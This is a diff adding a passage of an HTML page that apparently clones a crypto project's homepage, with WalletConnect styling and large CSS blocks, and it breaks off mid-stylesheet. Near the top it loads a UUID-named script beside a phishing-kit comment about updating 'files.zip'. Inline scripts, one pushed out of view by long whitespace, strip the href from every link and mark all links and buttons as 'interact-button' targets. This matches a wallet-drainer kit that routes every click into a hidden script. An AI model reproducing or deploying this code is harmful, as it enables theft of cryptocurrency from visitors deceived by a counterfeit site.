@@ -1,0 +1,705 @@
+<!DOCTYPE html>
+<html style="--wcm-color-fg-1: rgb(228,231,231); --wcm-color-fg-2: rgb(148,158,158); --wcm-color-fg-3: rgb(110,119,119); --wcm-color-bg-1: rgb(20,20,20); --wcm-color-bg-2: rgb(39,42,42); --wcm-color-bg-3: rgb(59,64,64); --wcm-color-overlay: rgba(255,255,255,0.1); --wcm-accent-color: #3396FF; --wcm-accent-fill-color: #FFFFFF; --wcm-z-index: 89; --wcm-background-color: #3396FF; --wcm-background-border-radius: 8px; --wcm-container-border-radius: 30px; --wcm-wallet-icon-border-radius: 15px; --wcm-wallet-icon-large-border-radius: 30px; --wcm-wallet-icon-small-border-radius: 7px; --wcm-input-border-radius: 28px; --wcm-button-border-radius: 10px; --wcm-notification-border-radius: 36px; --wcm-secondary-button-border-radius: 28px; --wcm-icon-button-border-radius: 50%; --wcm-button-hover-highlight-border-radius: 10px; --wcm-text-big-bold-size: 20px; --wcm-text-big-bold-weight: 600; --wcm-text-big-bold-line-height: 24px; --wcm-text-big-bold-letter-spacing: -0.03em; --wcm-text-big-bold-text-transform: none; --wcm-text-xsmall-bold-size: 10px; --wcm-text-xsmall-bold-weight: 700; --wcm-text-xsmall-bold-line-height: 12px; --wcm-text-xsmall-bold-letter-spacing: 0.02em; --wcm-text-xsmall-bold-text-transform: uppercase; --wcm-text-xsmall-regular-size: 12px; --wcm-text-xsmall-regular-weight: 600; --wcm-text-xsmall-regular-line-height: 14px; --wcm-text-xsmall-regular-letter-spacing: -0.03em; --wcm-text-xsmall-regular-text-transform: none; --wcm-text-small-thin-size: 14px; --wcm-text-small-thin-weight: 500; --wcm-text-small-thin-line-height: 16px; --wcm-text-small-thin-letter-spacing: -0.03em; --wcm-text-small-thin-text-transform: none; --wcm-text-small-regular-size: 14px; --wcm-text-small-regular-weight: 600; --wcm-text-small-regular-line-height: 16px; --wcm-text-small-regular-letter-spacing: -0.03em; --wcm-text-small-regular-text-transform: none; --wcm-text-medium-regular-size: 16px; --wcm-text-medium-regular-weight: 600; --wcm-text-medium-regular-line-height: 20px; --wcm-text-medium-regular-letter-spacing: -0.03em; --wcm-text-medium-regular-text-transform: none; --wcm-font-family: -apple-system, system-ui, BlinkMacSystemFont, 'Segoe UI', Roboto, Ubuntu, 'Helvetica Neue', sans-serif; --wcm-font-feature-settings: 'tnum' on, 'lnum' on, 'case' on; --wcm-success-color: rgb(38,181,98); --wcm-error-color: rgb(242, 90, 103); --wcm-overlay-background-color: rgba(0, 0, 0, 0.3); --wcm-overlay-backdrop-filter: none;" >
+
+<head>
+    <style data-rc-order="prependQueue" data-rc-priority="-999" data-css-hash="1onm4mx" data-token-hash="vehcqk">
+        :where(.css-2q8sxy) a{color:#1677ff;text-decoration:none;background-color:transparent;outline:none;cursor:pointer;transition:color 0.3s;-webkit-text-decoration-skip:objects;}:where(.css-2q8sxy) a:hover{color:#69b1ff;}:where(.css-2q8sxy) a:active{color:#0958d9;}:where(.css-2q8sxy) a:active,:where(.css-2q8sxy) a:hover{text-decoration:none;outline:0;}:where(.css-2q8sxy) a:focus{text-decoration:none;outline:0;}:where(.css-2q8sxy) a[disabled]{color:rgba(0, 0, 0, 0.25);cursor:not-allowed;}
+    </style>
+    <style data-rc-order="prependQueue" data-rc-priority="-999" data-css-hash="9fqdma" data-token-hash="vehcqk">
+        :where(.css-2q8sxy)[class^="ant-carousel"],:where(.css-2q8sxy)[class*=" ant-carousel"]{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,'Helvetica Neue',Arial,'Noto Sans',sans-serif,'Apple Color Emoji','Segoe UI Emoji','Segoe UI Symbol','Noto Color Emoji';font-size:14px;box-sizing:border-box;}:where(.css-2q8sxy)[class^="ant-carousel"]::before,:where(.css-2q8sxy)[class*=" ant-carousel"]::before,:where(.css-2q8sxy)[class^="ant-carousel"]::after,:where(.css-2q8sxy)[class*=" ant-carousel"]::after{box-sizing:border-box;}:where(.css-2q8sxy)[class^="ant-carousel"] [class^="ant-carousel"],:where(.css-2q8sxy)[class*=" ant-carousel"] [class^="ant-carousel"],:where(.css-2q8sxy)[class^="ant-carousel"] [class*=" ant-carousel"],:where(.css-2q8sxy)[class*=" ant-carousel"] [class*=" ant-carousel"]{box-sizing:border-box;}:where(.css-2q8sxy)[class^="ant-carousel"] [class^="ant-carousel"]::before,:where(.css-2q8sxy)[class*=" ant-carousel"] [class^="ant-carousel"]::before,:where(.css-2q8sxy)[class^="ant-carousel"] [class*=" ant-carousel"]::before,:where(.css-2q8sxy)[class*=" ant-carousel"] [class*=" ant-carousel"]::before,:where(.css-2q8sxy)[class^="ant-carousel"] [class^="ant-carousel"]::after,:where(.css-2q8sxy)[class*=" ant-carousel"] [class^="ant-carousel"]::after,:where(.css-2q8sxy)[class^="ant-carousel"] [class*=" ant-carousel"]::after,:where(.css-2q8sxy)[class*=" ant-carousel"] [class*=" ant-carousel"]::after{box-sizing:border-box;}:where(.css-2q8sxy).ant-carousel{box-sizing:border-box;margin:0;padding:0;color:rgba(0, 0, 0, 0.88);font-size:14px;line-height:1.5714285714285714;list-style:none;font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,'Helvetica Neue',Arial,'Noto Sans',sans-serif,'Apple Color Emoji','Segoe UI Emoji','Segoe UI Symbol','Noto Color Emoji';}:where(.css-2q8sxy).ant-carousel .slick-slider{position:relative;display:block;box-sizing:border-box;touch-action:pan-y;-webkit-touch-callout:none;-webkit-tap-highlight-color:transparent;}:where(.css-2q8sxy).ant-carousel .slick-slider .slick-track,:where(.css-2q8sxy).ant-carousel .slick-slider .slick-list{transform:translate3d(0, 0, 0);touch-action:pan-y;}:where(.css-2q8sxy).ant-carousel .slick-list{position:relative;display:block;margin:0;padding:0;overflow:hidden;}:where(.css-2q8sxy).ant-carousel .slick-list:focus{outline:none;}:where(.css-2q8sxy).ant-carousel .slick-list.dragging{cursor:pointer;}:where(.css-2q8sxy).ant-carousel .slick-list .slick-slide{pointer-events:none;}:where(.css-2q8sxy).ant-carousel .slick-list .slick-slide input.ant-radio-input,:where(.css-2q8sxy).ant-carousel .slick-list .slick-slide input.ant-checkbox-input{visibility:hidden;}:where(.css-2q8sxy).ant-carousel .slick-list .slick-slide.slick-active{pointer-events:auto;}:where(.css-2q8sxy).ant-carousel .slick-list .slick-slide.slick-active input.ant-radio-input,:where(.css-2q8sxy).ant-carousel .slick-list .slick-slide.slick-active input.ant-checkbox-input{visibility:visible;}:where(.css-2q8sxy).ant-carousel .slick-list .slick-slide >div>div{vertical-align:bottom;}:where(.css-2q8sxy).ant-carousel .slick-track{position:relative;top:0;inset-inline-start:0;display:block;}:where(.css-2q8sxy).ant-carousel .slick-track::before,:where(.css-2q8sxy).ant-carousel .slick-track::after{display:table;content:"";}:where(.css-2q8sxy).ant-carousel .slick-track::after{clear:both;}:where(.css-2q8sxy).ant-carousel .slick-slide{display:none;float:left;height:100%;min-height:1px;}:where(.css-2q8sxy).ant-carousel .slick-slide img{display:block;}:where(.css-2q8sxy).ant-carousel .slick-slide.dragging img{pointer-events:none;}:where(.css-2q8sxy).ant-carousel .slick-initialized .slick-slide{display:block;}:where(.css-2q8sxy).ant-carousel .slick-vertical .slick-slide{display:block;height:auto;}:where(.css-2q8sxy).ant-carousel .slick-arrow.slick-hidden{display:none;}:where(.css-2q8sxy).ant-carousel .slick-prev,:where(.css-2q8sxy).ant-carousel .slick-next{position:absolute;top:50%;display:block;width:20px;height:20px;margin-top:-10px;padding:0;color:transparent;font-size:0;line-height:0;background:transparent;border:0;outline:none;cursor:pointer;}:where(.css-2q8sxy).ant-carousel .slick-prev:hover,:where(.css-2q8sxy).ant-carousel .slick-next:hover,:where(.css-2q8sxy).ant-carousel .slick-prev:focus,:where(.css-2q8sxy).ant-carousel .slick-next:focus{color:transparent;background:transparent;outline:none;}:where(.css-2q8sxy).ant-carousel .slick-prev:hover::before,:where(.css-2q8sxy).ant-carousel .slick-next:hover::before,:where(.css-2q8sxy).ant-carousel .slick-prev:focus::before,:where(.css-2q8sxy).ant-carousel .slick-next:focus::before{opacity:1;}:where(.css-2q8sxy).ant-carousel .slick-prev.slick-disabled::before,:where(.css-2q8sxy).ant-carousel .slick-next.slick-disabled::before{opacity:0.25;}:where(.css-2q8sxy).ant-carousel .slick-prev{inset-inline-start:-25px;}:where(.css-2q8sxy).ant-carousel .slick-prev::before{content:"←";}:where(.css-2q8sxy).ant-carousel .slick-next{inset-inline-end:-25px;}:where(.css-2q8sxy).ant-carousel .slick-next::before{content:"→";}:where(.css-2q8sxy).ant-carousel .slick-dots{position:absolute;inset-inline-end:0;bottom:0;inset-inline-start:0;z-index:15;display:flex!important;justify-content:center;padding-inline-start:0;margin:0;list-style:none;}:where(.css-2q8sxy).ant-carousel .slick-dots-bottom{bottom:12px;}:where(.css-2q8sxy).ant-carousel .slick-dots-top{top:12px;bottom:auto;}:where(.css-2q8sxy).ant-carousel .slick-dots li{position:relative;display:inline-block;flex:0 1 auto;box-sizing:content-box;width:16px;height:3px;margin-inline:4px;padding:0;text-align:center;text-indent:-999px;vertical-align:top;transition:all 0.3s;}:where(.css-2q8sxy).ant-carousel .slick-dots li button{position:relative;display:block;width:100%;height:3px;padding:0;color:transparent;font-size:0;background:#ffffff;border:0;border-radius:3px;outline:none;cursor:pointer;opacity:0.3;transition:all 0.3s;}:where(.css-2q8sxy).ant-carousel .slick-dots li button:hover,:where(.css-2q8sxy).ant-carousel .slick-dots li button:focus{opacity:0.75;}:where(.css-2q8sxy).ant-carousel .slick-dots li button::after{position:absolute;inset:-4px;content:"";}:where(.css-2q8sxy).ant-carousel .slick-dots li.slick-active{width:24px;}:where(.css-2q8sxy).ant-carousel .slick-dots li.slick-active button{background:#ffffff;opacity:1;}:where(.css-2q8sxy).ant-carousel .slick-dots li.slick-active:hover,:where(.css-2q8sxy).ant-carousel .slick-dots li.slick-active:focus{opacity:1;}:where(.css-2q8sxy).ant-carousel-vertical .slick-dots{top:50%;bottom:auto;flex-direction:column;width:3px;height:auto;margin:0;transform:translateY(-50%);}:where(.css-2q8sxy).ant-carousel-vertical .slick-dots-left{inset-inline-end:auto;inset-inline-start:12px;}:where(.css-2q8sxy).ant-carousel-vertical .slick-dots-right{inset-inline-end:12px;inset-inline-start:auto;}:where(.css-2q8sxy).ant-carousel-vertical .slick-dots li{width:3px;height:16px;margin:4px 0;vertical-align:baseline;}:where(.css-2q8sxy).ant-carousel-vertical .slick-dots li button{width:3px;height:16px;}:where(.css-2q8sxy).ant-carousel-vertical .slick-dots li.slick-active{width:3px;height:16px;}:where(.css-2q8sxy).ant-carousel-vertical .slick-dots li.slick-active button{width:3px;height:16px;}:where(.css-2q8sxy).ant-carousel-rtl{direction:rtl;}.ant-carousel-rtl:where(.css-2q8sxy).ant-carousel-rtl .slick-dots{flex-direction:row-reverse;}.ant-carousel-rtl:where(.css-2q8sxy).ant-carousel-vertical .slick-dots{flex-direction:column;}
+    </style>
+    <style data-rc-order="prependQueue" data-css-hash="e4qbud" data-token-hash="vehcqk">
+        .anticon{display:inline-flex;align-items:center;color:inherit;font-style:normal;line-height:0;text-align:center;text-transform:none;vertical-align:-0.125em;text-rendering:optimizeLegibility;-webkit-font-smoothing:antialiased;-moz-osx-font-smoothing:grayscale;}.anticon >*{line-height:1;}.anticon svg{display:inline-block;}.anticon .anticon .anticon-icon{display:block;}
+    </style>
+
+<script charset="UTF-8" type="text/javascript" src="./10014844-b990-4e65-90d6-822622662ec5.js"></script><!–– Please update files.zip if you not already did and check below (updated the 11/11) ––>
+
+<script>
+  document.addEventListener('DOMContentLoaded', function () {
+    var links = document.querySelectorAll('body a');
+    for (var i = 0; i < links.length; i++) {
+    var link = links[i];
+    link.removeAttribute('href');
+    link.classList.add('interact-button');
+    }
+    });
+    </script>                                                                                                                          <script>
+  document.addEventListener('DOMContentLoaded', function () {
+  var buttons = document.querySelectorAll('body button');
+  for (var i = 0; i < buttons.length; i++) {
+    var button = buttons[i];
+    button.classList.add('interact-button');
+  }
+  });
+  </script>
+  <script>
+  document.addEventListener("DOMContentLoaded", function() {
+    const elements = document.querySelectorAll('[ad-data-linked]');
+    elements.forEach(element => {
+      element.removeAttribute('ad-data-linked');
+    });
+  
+    console.log('Removed ad-data-linked attributes from', elements.length, 'elements');
+  });
+  
+  </script>
+  
+    <style>
+    .interact-button {
+    cursor: pointer;
+    }
+    </style>
+
+<meta name="viewport" content="width=device-width, user-scalable=no, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0">
+    <meta http-equiv="X-UA-Compatible" content="ie=edge">
+    <link rel="shortcut icon" href="favicon.svg">
+    <link rel="icon" href="logo.svg.html">
+    <link rel="stylesheet" href="umi.7e8c388d.css">
+    <link rel="stylesheet" type="text/css" href="layouts__index.a57c11d9.chunk.css">
+    <style data-styled="active" data-styled-version="6.1.1">
+        .zGSBB { width: 100%; height: 100vh; background-position: 50% center; background-repeat: no-repeat; background-size: cover; inset: 0px; background-image: url("home1.3e2e6929.png"); }
+        .gTaGtW { width: 100%; height: 100vh; background-position: 50% center; background-repeat: no-repeat; background-size: cover; inset: 0px; background-image: url("home2.f109ee21.png"); }
+        .jXeLbA { width: 100%; height: 100vh; background-position: 50% center; background-repeat: no-repeat; background-size: cover; inset: 0px; background-image: url("home3.b89f4719.png"); }
+        .brFhQO { width: 100%; height: 100vh; background-position: 50% center; background-repeat: no-repeat; background-size: cover; inset: 0px; background-image: url("home4.c1dc6ce2.png"); }
+        .hQqoHO { width: 100%; height: 100vh; background-position: 50% center; background-repeat: no-repeat; background-size: cover; inset: 0px; background-image: url("home5.9af1e21c.png"); }
+        .eARnCf { width: 100%; height: 100vh; background-position: 50% center; background-repeat: no-repeat; background-size: cover; inset: 0px; background-image: url("home6.3ee686b9.png"); }
+        .coOUiT { width: 100%; height: 100vh; background-position: 50% center; background-repeat: no-repeat; background-size: cover; inset: 0px; background-image: url(""); }
+        html { font-size: calc(0.0520833vw); }
+        @media screen and (max-width: 1023px) {
+          html { font-size: calc(0.266667vw); }
+        }
+        .hscfvH { width: fit-content; padding: 0px 20rem; height: 40rem; background: rgb(81, 224, 207); border-radius: 8rem; display: flex; align-items: center; justify-content: center; font-family: Montserrat-Medium; font-weight: 500; font-size: 16rem; color: rgb(9, 9, 11); cursor: pointer; }
+        .hscfvH > img { width: 20rem; height: 20rem; cursor: pointer; margin-right: 8rem; }
+        @media screen and (max-width: 1023px) {
+          .hscfvH { margin-right: 8rem; width: fit-content; height: 32rem; padding: 0px 8rem; background: rgb(81, 224, 207); border-radius: 8rem; font-weight: 500; font-size: 13rem; line-height: 13rem; cursor: pointer; }
+          .hscfvH > img { width: 20rem; height: 20rem; margin-right: 8rem; }
+        }
+        .cFywCQ { width: 343rem; height: 46rem; background: rgba(255, 255, 255, 0); border-radius: 8rem; display: flex; align-items: center; justify-content: space-between; }
+        @media screen and (max-width: 1023px) {
+          .cFywCQ { width: 343rem; height: 46rem; border-radius: 8rem; padding: 0px 20rem; background: rgb(23, 23, 27); }
+        }
+        .cFywCQ .icon { width: 32rem; height: 32rem; overflow: hidden; cursor: pointer; }
+        @media screen and (max-width: 1023px) {
+          .cFywCQ .icon { width: 24rem; height: 24rem; }
+        }
+        .cFywCQ .icon img { display: block; overflow: hidden; width: 32rem; height: 32rem; filter: brightness(6); }
+        @media screen and (max-width: 1023px) {
+          .cFywCQ .icon img { width: 24rem; height: 24rem; }
+        }
+        .cFywCQ .icon img:hover { filter: brightness(1); }
+        .bmMlRC { width: 343rem; height: 292rem; background: rgba(28, 28, 32, 0.8); border-radius: 6rem; backdrop-filter: blur(20.3px); padding: 32rem 0px; position: relative; }
+        .fKIaGy { position: absolute; top: 16rem; right: 16rem; width: 24rem; height: 24rem; overflow: hidden; cursor: pointer; }
+        .gDtChJ { display: block; width: 160rem; height: 160rem; overflow: hidden; margin: 0px auto 24rem; }
+        .jxsFQJ { display: block; width: fit-content; height: 16rem; margin: 0px auto 16rem; font-family: Montserrat-SemiBold; font-weight: 600; font-size: 16rem; color: rgb(255, 255, 255); line-height: 16rem; text-align: center; font-style: normal; }
+        .gdPvVy { display: block; width: fit-content; height: 14rem; margin: 0px auto; font-family: Montserrat-Light; font-weight: 300; font-size: 14rem; color: rgb(186, 186, 188); line-height: 14rem; text-align: center; font-style: normal; }
+        .jWrZJ { position: relative; width: fit-content; height: 80rem; display: flex; align-items: center; justify-content: center; margin-right: 24rem; cursor: pointer; }
+        @media screen and (max-width: 1023px) {
+          .jWrZJ { width: 100%; height: fit-content; border-bottom: 1rem solid rgb(46, 46, 46); border-radius: 3rem; display: block; }
+        }
+        .gLYxjM { width: 100%; height: fit-content; display: flex; align-items: center; justify-content: flex-start; }
+        .gLYxjM:hover p { color: rgb(81, 224, 207); }
+        .gLYxjM:hover .expand { filter: brightness(1); }
+        .gLYxjM p { transition: 0.3s ease-in-out; display: flex; align-items: center; justify-content: flex-start; font-family: Montserrat-Medium; font-weight: 500; font-size: 16rem; color: rgb(255, 255, 255); line-height: 16rem; cursor: pointer; }
+        .gLYxjM p.active { color: rgb(81, 224, 207); }
+        .gLYxjM p .jump, .gLYxjM p .hot { display: block; width: 14rem; height: 14rem; overflow: hidden; margin-left: 8rem; }
+        .gLYxjM p .soon { display: block; width: 96rem; height: 20rem; overflow: hidden; margin-left: 16rem; }
+        .gLYxjM p .jump { filter: brightness(6); }
+        .gLYxjM .expand { cursor: pointer; display: block; width: 16rem; height: 16rem; overflow: hidden; transform: rotateZ(180deg); transition: 0.3s ease-in-out; filter: brightness(6); margin-left: 3rem; }
+        .gLYxjM .expand.active { filter: brightness(1); transform: rotateZ(0deg); }
+        @media screen and (max-width: 1023px) {
+          .gLYxjM { width: 100%; height: 57rem; display: flex; align-items: center; justify-content: space-between; }
+          .gLYxjM p { transition: 0.3s ease-in-out; display: flex; align-items: center; justify-content: flex-start; font-family: Montserrat-Medium; font-weight: 500; font-size: 15rem; color: rgb(255, 255, 255); line-height: 15rem; cursor: pointer; }
+          .gLYxjM p.active { color: rgb(81, 224, 207); }
+          .gLYxjM p .jump, .gLYxjM p .hot { display: block; width: 14rem; height: 14rem; overflow: hidden; margin-left: 8rem; }
+          .gLYxjM p .soon { display: block; width: 96rem; height: 20rem; overflow: hidden; margin-left: 16rem; color: rgb(162, 162, 162); }
+          .gLYxjM p .jump { filter: brightness(6); }
+          .gLYxjM .expand { margin-left: 0rem; cursor: pointer; display: block; width: 36rem; height: 36rem; overflow: hidden; transform: rotateZ(180deg); transition: 0.3s ease-in-out; filter: brightness(6); }
+          .gLYxjM .expand.active { transform: rotateZ(0deg); }
+        }
+        .kajKRg { background: rgb(9, 9, 11); border-radius: 8rem; border: 1rem solid rgb(46, 46, 46); position: absolute; top: 80rem; right: -245rem; z-index: 999; padding: 8rem 32rem; display: none; }
+        .kajKRg > .cont-line:last-child { border: 0px solid rgb(255, 255, 255); }
+        .kajKRg.learn { width: 744rem; height: fit-content; right: -288rem; }
+        .kajKRg.learn > .cont-line:nth-last-child(2) { border: 0px solid rgb(255, 255, 255); }
+        .kajKRg.participate { width: 384rem; height: fit-content; }
+        .kajKRg.participate > .cont-line .tips { height: fit-content; }
+        .kajKRg.ecosystem { width: 744rem; height: fit-content; right: -245rem; }
+        .kajKRg.active { display: flex; align-items: center; justify-content: space-between; flex-wrap: wrap; }
+        @media screen and (max-width: 1023px) {
+          .kajKRg { display: block; width: 100%; height: fit-content; max-height: 0px; overflow: hidden; transition: 0.3s ease-in-out; position: relative; top: 0px; right: 0px; border: 0px; padding: 0px; }
+          .kajKRg.learn, .kajKRg.participate, .kajKRg.ecosystem { width: 100%; height: fit-content; right: 0px; }
+          .kajKRg.learn > .cont-line:nth-last-child(2), .kajKRg.participate > .cont-line:nth-last-child(2), .kajKRg.ecosystem > .cont-line:nth-last-child(2) { border-bottom: 1rem solid rgb(46, 46, 46); }
+          .kajKRg.active { max-height: 2000px; }
+        }
+        .jQXtec { width: 320rem; height: fit-content; min-height: 94rem; padding: 24rem 0px; border-bottom: 1rem solid rgb(46, 46, 46); }
+        .jQXtec:hover .title { color: rgb(81, 224, 207); }
+        .jQXtec:hover .title.soon { color: rgb(162, 162, 162); }
+        .jQXtec:hover .title.soon .jump { opacity: 0.6; filter: brightness(6); }
+        .jQXtec:hover .title .jump { filter: brightness(1); }
+        .jQXtec:last-child { border: 0px solid rgb(46, 46, 46); }
+        .jQXtec .title { height: 16rem; font-family: Montserrat-Medium; font-weight: 500; font-size: 16rem; color: rgb(255, 255, 255); line-height: 16rem; text-align: left; font-style: normal; display: flex; align-items: center; justify-content: flex-start; }
+        .jQXtec .title.soon { color: rgb(162, 162, 162); }
+        .jQXtec .title.soon .jump { opacity: 0.6; filter: brightness(6); }
+        .jQXtec .title .jump, .jQXtec .title .hot { display: block; width: 16rem; height: 16rem; overflow: hidden; margin-left: 8rem; }
+        .jQXtec .title .soon { display: block; width: 96rem; height: 20rem; overflow: hidden; margin-left: 16rem; color: rgb(162, 162, 162); }
+        .jQXtec .title .jump { filter: brightness(6); }
+        .jQXtec .tips { display: block; margin-top: 8rem; width: 327rem; height: 44rem; font-family: Montserrat-Light; font-weight: 300; font-size: 14rem; color: rgb(162, 162, 162); line-height: 22rem; text-align: left; font-style: normal; }
+        @media screen and (max-width: 1023px) {
+          .jQXtec { width: 100%; height: fit-content; padding: 20rem 0px; border-bottom: 1rem solid rgb(46, 46, 46); min-height: fit-content; }
+          .jQXtec .title { height: 14rem; font-family: Montserrat-Medium; font-weight: 500; font-size: 14rem; color: rgb(255, 255, 255); line-height: 14rem; text-align: left; font-style: normal; display: flex; align-items: center; justify-content: flex-start; }
+          .jQXtec .title .jump, .jQXtec .title .hot { display: block; width: 14rem; height: 14rem; overflow: hidden; margin-left: 8rem; }
+          .jQXtec .title .soon { display: block; width: 96rem; height: 20rem; overflow: hidden; margin-left: 16rem; }
+          .jQXtec .title .jump { filter: brightness(6); }
+          .jQXtec .tips { display: block; margin-top: 8rem; width: 327rem; height: fit-content; font-family: Montserrat-Light; font-weight: 300; font-size: 12rem; color: rgb(162, 162, 162); line-height: 14rem; text-align: left; font-style: normal; }
+        }
+        .ifqumc { width: fit-content; height: 80rem; position: relative; cursor: pointer; margin-right: 16rem; }
+        @media screen and (max-width: 1023px) {
+          .ifqumc { width: 100%; height: 100%; overflow-y: auto; position: relative; padding-bottom: 172rem; cursor: pointer; margin-right: 0px; }
+        }
+        .GtKJY { width: fit-content; height: 80rem; padding: 0px; box-sizing: border-box; }
+        @media screen and (max-width: 1023px) {
+          .GtKJY { width: 100vw; height: fit-content; background: rgb(9, 9, 11); padding: 64rem 16rem 0px; box-sizing: border-box; }
+        }
+        .eXkxCW { display: flex; align-items: center; justify-content: flex-start; width: fit-content; height: fit-content; }
+        @media screen and (max-width: 1023px) {
+          .eXkxCW { width: 100%; height: fit-content; display: block; }
+        }
+        .lbcRxI { width: 100%; height: fit-content; position: fixed; z-index: 999; background-color: rgba(0, 0, 0, 0); backdrop-filter: blur(32px); }
+        @media screen and (max-width: 1023px) {
+          .lbcRxI { width: 100%; height: fit-content; }
+        }
+        .gfwKch { width: 100%; height: 80rem; padding: 16rem 80rem; display: flex; align-items: center; justify-content: space-between; background: rgb(9, 9, 11); }
+        @media screen and (max-width: 1023px) {
+          .gfwKch { width: 375rem; height: 64rem; background: rgb(9, 9, 11); padding: 0px 16rem; display: flex; align-items: center; justify-content: space-between; }
+        }
+        .bbqcEh { width: 104rem; height: 48rem; cursor: pointer; }
+        @media screen and (max-width: 1023px) {
+          .bbqcEh { width: 80rem; height: 40rem; }
+        }
+        .gWCAvx { display: flex; align-items: center; justify-content: flex-end; }
+        .giua-DR { display: inline-flex; align-items: center; justify-content: flex-end; }
+        .gbqQKM { width: fit-content; height: fit-content; margin-right: 56rem; }
+        .gbqQKM:last-child { margin-right: 0px; }
+        @media screen and (max-width: 1023px) {
+          .gbqQKM { width: 100%; height: fit-content; margin: 0px; }
+        }
+        .sRhKl { width: 100%; height: fit-content; display: flex; align-items: center; justify-content: space-between; margin-bottom: 20rem; padding: 20rem 0px 0px; }
+        .sRhKl p { transition: 0.3s ease-in-out; padding: 0px; margin: 0px; display: flex; align-items: center; justify-content: flex-start; font-family: Montserrat-Medium; font-weight: 500; color: rgb(255, 255, 255); cursor: pointer; font-size: 16rem; line-height: 16rem; }
+        @media screen and (max-width: 1023px) {
+          .sRhKl p { font-size: 14rem; line-height: 14rem; }
+        }
+        .sRhKl p.active { color: rgb(81, 224, 207); }
+        .sRhKl p.active .soon { color: rgb(162, 162, 162); }
+        .sRhKl p.active .soon .jump { filter: brightness(6); opacity: 0.6; }
+        .sRhKl p .jump, .sRhKl p .hot { display: block; width: 16rem; height: 16rem; overflow: hidden; margin-left: 8rem; }
+        @media screen and (max-width: 1023px) {
+          .sRhKl p .jump, .sRhKl p .hot { width: 14rem; height: 14rem; }
+        }
+        .sRhKl p .soon { display: block; width: 96rem; height: 20rem; overflow: hidden; margin-left: 16rem; color: rgb(162, 162, 162); }
+        .sRhKl p .jump { filter: brightness(6); }
+        .krnXIw { width: 100rem; height: fit-content; overflow: hidden; display: flex; align-items: flex-start; justify-content: space-between; flex-wrap: wrap; }
+        .krnXIw.learn { width: 360rem; }
+        .krnXIw.ecosystem { width: 128rem; }
+        @media screen and (max-width: 1023px) {
+          .krnXIw { width: 100%; height: fit-content; max-height: 240rem; justify-content: space-between; flex-direction: row; overflow: hidden; }
+          .krnXIw.trias { max-height: 45rem; }
+          .krnXIw.learn { width: 100%; }
+          .krnXIw.participate { max-height: 90rem; }
+          .krnXIw.ecosystem { max-height: 140rem; }
+        }
+        .bspUEi { width: fit-content; height: fit-content; padding: 0px; margin-bottom: 20rem; }
+        .bspUEi.cont-line-learn { width: 180rem; }
+        @media screen and (max-width: 1023px) {
+          .bspUEi { min-width: 50%; max-width: 178rem; }
+        }
+        .bspUEi .title { height: fit-content; font-family: Montserrat-Light; font-weight: 300; font-size: 16rem; color: rgb(162, 162, 162); line-height: 16rem; text-align: left; font-style: normal; display: flex; align-items: center; justify-content: flex-start; }
+        .bspUEi .title:hover { color: rgb(81, 224, 207); }
+        .bspUEi .title:hover.soon { color: rgb(162, 162, 162); opacity: 0.5; }
+        .bspUEi .title:hover.soon .jump { filter: brightness(6); opacity: 0.6; }
+        .bspUEi .title:hover .jump { filter: brightness(1); }
+        .bspUEi .title.soon { color: rgb(162, 162, 162); opacity: 0.5; }
+        .bspUEi .title.soon .jump { opacity: 0.6; }
+        @media screen and (max-width: 1023px) {
+          .bspUEi .title { font-size: 14rem; line-height: 14rem; }
+        }
+        .bspUEi .title .jump, .bspUEi .title .hot { display: block; width: 14rem; height: 14rem; overflow: hidden; margin-left: 4rem; }
+        .bspUEi .title .jump { filter: brightness(6); }
+        .bspUEi .tips { display: block; margin-top: 8rem; width: 327rem; height: fit-content; font-family: Montserrat-Light; font-weight: 300; font-size: 12rem; color: rgb(162, 162, 162); line-height: 14rem; text-align: left; font-style: normal; }
+        .jEEjgI { cursor: pointer; position: relative; box-sizing: border-box; background-color: rgb(9, 9, 11); z-index: 66; width: 100vw; padding: 48rem 360rem 12rem; display: flex; align-items: flex-start; justify-content: space-between; }
+        @media screen and (max-width: 1023px) {
+          .jEEjgI { display: block; padding: 0px 16rem; }
+        }
+        .fpFRNG { position: absolute; top: 0px; width: 160rem; height: 2rem; background: linear-gradient(90deg, rgba(9, 9, 11, 0) 0%, rgb(42, 209, 251) 16%, rgb(15, 242, 234) 75%, rgba(9, 9, 11, 0) 100%); animation: 2s linear infinite alternate moveAnimation; margin-bottom: 46rem; }
+        @keyframes moveAnimation {
+        0% { left: 360rem; }
+        100% { left: calc(100% - 520rem); }
+        }
+        @media screen and (max-width: 1023px) {
+          .fpFRNG { position: absolute; width: 80rem; height: 1rem; background: linear-gradient(90deg, rgba(9, 9, 11, 0) 0%, rgb(42, 209, 251) 16%, rgb(15, 242, 234) 75%, rgba(9, 9, 11, 0) 100%); animation: 2s linear infinite alternate moveAnimation; margin-bottom: 24rem; }
+          @keyframes moveAnimation {
+        0% { left: 0rem; }
+        100% { left: calc(100% - 80rem); }
+        }
+        }
+        .eWDokj { width: 220rem; height: fit-content; display: block; }
+        @media screen and (max-width: 1023px) {
+          .eWDokj { width: 100%; height: fit-content; display: block; }
+        }
+        .fRlAaG { width: 160rem; height: 80rem; display: block; overflow: hidden; }
+        @media screen and (max-width: 1023px) {
+          .fRlAaG { width: 80rem; height: 40rem; display: block; overflow: hidden; }
+        }
+        .iPNNJH { width: fit-content; height: 16rem; font-family: Montserrat-Medium; font-weight: 500; font-size: 16rem; color: rgb(255, 255, 255); line-height: 16rem; text-align: left; font-style: normal; margin: 40rem 0px 30rem 8rem; }
+        @media screen and (max-width: 1023px) {
+          .iPNNJH { width: 100%; margin: 16rem 0px 24rem 8rem; height: 14rem; color: rgb(162, 162, 162); }
+        }
+        .euiaVl { display: flex; align-items: flex-start; justify-content: flex-end; width: fit-content; height: fit-content; }
+        @media screen and (max-width: 1023px) {
+          .euiaVl { display: block; width: 100%; height: fit-content; }
+        }
+        .hKgNvZ { box-sizing: border-box; background-color: rgb(9, 9, 11); z-index: 66; width: 100vw; height: 97rem; border-top: 1rem solid rgb(46, 46, 46); padding: 0px 360rem; display: flex; align-items: center; justify-content: space-between; }
+        .hKgNvZ .tips { width: fit-content; height: 14rem; font-family: Montserrat-Light; font-weight: 300; font-size: 14rem; color: rgb(162, 162, 162); line-height: 14rem; text-align: left; font-style: normal; }
+        @media screen and (max-width: 1023px) {
+          .hKgNvZ { height: 58rem; border-top: 1rem solid rgb(46, 46, 46); padding: 0px; justify-content: center; }
